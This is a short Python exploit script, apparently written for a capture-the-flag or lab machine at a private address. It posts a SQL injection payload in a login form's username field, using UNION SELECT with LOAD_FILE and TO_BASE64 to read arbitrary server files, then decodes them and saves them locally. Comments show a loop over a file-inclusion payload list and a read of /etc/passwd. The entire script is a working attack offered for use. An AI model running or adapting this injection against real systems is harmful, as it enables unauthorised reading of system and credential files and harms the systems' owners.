import requests
import sys
import re
import os
import base64
#print("for i in $(cat LFI\ payloads.txt); do echo $i;python3 req.py http://10.129.168.39/administrative $i;done ")
#url = sys.argv[1]
payload = sys.argv[1]

regex = re.compile(r"admin(.*)</h3>", re.DOTALL)
#union select 1,LOAD_FILE("/etc/passwd"),3,4,5,6-- -
data = {"uname":f"admin' union select 1,TO_BASE64(LOAD_FIlE(\"{payload}\")),3,4,5,6-- -","password":"Hello Mr j"}

r = requests.post('http://10.129.168.202/administrative' , data=data)
match = re.search(regex, r.text)

fname = payload.replace("/", "_")[1:]

if not os.path.exists('files'):
    os.mkdir('files')
    print('Created Directory')
try:
    if match.group(1) != 'None':
        output = base64.b64decode(match.group(1)+ '=' * (-len(match.group(1)) % 4))
        print(output.decode())
        with open('files/'+fname,'w') as f:
            f.write(match.group(1))

except OSError:
    print('Text is so long')
except AttributeError:
    pass
